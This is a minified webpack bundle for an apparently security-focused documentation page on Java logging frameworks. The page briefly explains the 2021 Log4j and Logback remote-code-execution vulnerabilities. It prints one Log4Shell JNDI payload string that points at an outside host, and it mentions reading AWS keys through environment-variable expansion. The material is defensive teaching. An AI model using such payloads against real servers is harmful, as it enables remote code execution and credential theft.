"use strict";(self.webpackChunkcontrast_dev=self.webpackChunkcontrast_dev||[]).push([[9073],{3905:function(e,t,n){n.d(t,{Zo:function(){return u},kt:function(){return p}});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=r.createContext({}),c=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},u=function(e){var t=c(e.components);return r.createElement(s.Provider,{value:t},e.children)},g={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,s=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),d=c(n),p=a,v=d["".concat(s,".").concat(p)]||d[p]||g[p]||o;return n?r.createElement(v,i(i({ref:t},u),{},{components:n})):r.createElement(v,i({ref:t},u))}));function p(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=d;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:a,i[1]=l;for(var c=2;c<o;c++)i[c]=n[c];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},4925:function(e,t,n){n.r(t),n.d(t,{assets:function(){return u},contentTitle:function(){return s},default:function(){return p},frontMatter:function(){return l},metadata:function(){return c},toc:function(){return g}});var r=n(7462),a=n(3366),o=(n(7294),n(3905)),i=["components"],l={title:"Logging",sidebar_position:2},s=void 0,c={unversionedId:"guides/learn-devsec/development/java/logging",id:"guides/learn-devsec/development/java/logging",title:"Logging",description:"Java developers have a large number of choices for logging:",source:"@site/learn/guides/learn-devsec/development/java/logging.md",sourceDirName:"guides/learn-devsec/development/java",slug:"/guides/learn-devsec/development/java/logging",permalink:"/learn/guides/learn-devsec/development/java/logging",editUrl:"https://github.com/contrastsecurity/contrastfree.contrastsecurity.com/blob/master/learn/guides/learn-devsec/development/java/logging.md",tags:[],version:"current",sidebarPosition:2,frontMatter:{title:"Logging",sidebar_position:2},sidebar:"docsSidebar",previous:{title:"JNDI",permalink:"/learn/guides/learn-devsec/development/java/jndi"},next:{title:"Shading",permalink:"/learn/guides/learn-devsec/development/java/shading"}},u={},g=[{value:"Logging Vulnerabilities",id:"logging-vulnerabilities",level:2}],d={toc:g};function p(e){var t=e.components,n=(0,a.Z)(e,i);return(0,o.kt)("wrapper",(0,r.Z)({},d,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("p",null,"Java developers have a large number of choices for logging:"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"System Logger - introduced in Java 9 (2017), an API that acts as a facade to other loggers."),(0,o.kt)("li",{parentName:"ul"},"JUL - Introduced in Java 1.4 (2002), the Java Util Logger, is generally available."),(0,o.kt)("li",{parentName:"ul"},"Log4j",(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},"Log4j2 - Released in 2014, a fast logging framework."),(0,o.kt)("li",{parentName:"ul"},"Log4j - Released in 2001 and end-of-lifed in 2015."))),(0,o.kt)("li",{parentName:"ul"},"Logback",(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},"Logback - Released 2006, intended as a successor of log4j."),(0,o.kt)("li",{parentName:"ul"},"SLF4J - Released 2005, a simple logging facade. This does not provide a logger, it provides a single API that can consolidate the other loggers."))),(0,o.kt)("li",{parentName:"ul"},"Apache Commong-Logging - Released in 2002 and end-of-lifed in 2014."),(0,o.kt)("li",{parentName:"ul"},"TinyLogger - Released in 2012, a fast logging framework.")),(0,o.kt)("p",null,"Many Java applications include more that one logger. In a ",(0,o.kt)("a",{parentName:"p",href:"https://nemo9cby.github.io/resources/pubs/icse2020_chen.pdf"},"2020 study by York University"),", researchers identified that Hadoop used six loggers and IntelliJ used twelve."),(0,o.kt)("h2",{id:"logging-vulnerabilities"},"Logging Vulnerabilities"),(0,o.kt)("p",null,"The main type of vulnerability that impacts logs it ",(0,o.kt)("a",{parentName:"p",href:"/learn/guides/learn-devsec/vulnerabilities/log-injection"},"Log Injection"),"."),(0,o.kt)("p",null,"In 2021, the logging framework Log4j, ",(0,o.kt)("a",{parentName:"p",href:"https://nvd.nist.gov/vuln/detail/CVE-2021-45046"},"Log4J2"),", and ",(0,o.kt)("a",{parentName:"p",href:"https://cve.report/CVE-2021-42550"},"Logback")," were vulnerable to ",(0,o.kt)("a",{parentName:"p",href:"/learn/guides/learn-devsec/vulnerabilities/remote-code-execution"},"Remote Code Execution"),", allowing attackers to take control over these servers when they logged user input. The vulnerable versions of log4j spanned from 2014 to 2021. Attackers could craft input that caused the application to load and execute remote classes over JNDI."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"${jndi:rmi://192.168.2.106:1099/vccvhr}\n")),(0,o.kt)("p",null,"When a server with a vulnerable Log4j writes that String to a log, it loads the remote code from the host and executes it. Attackers took advantage of this in two ways:"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Compromising the server to run code and steal data."),(0,o.kt)("li",{parentName:"ol"},"Expanding environment variables in the URL's hostname, to read sensitive data like AWS keys.")))}p.isMDXComponent=!0}}]);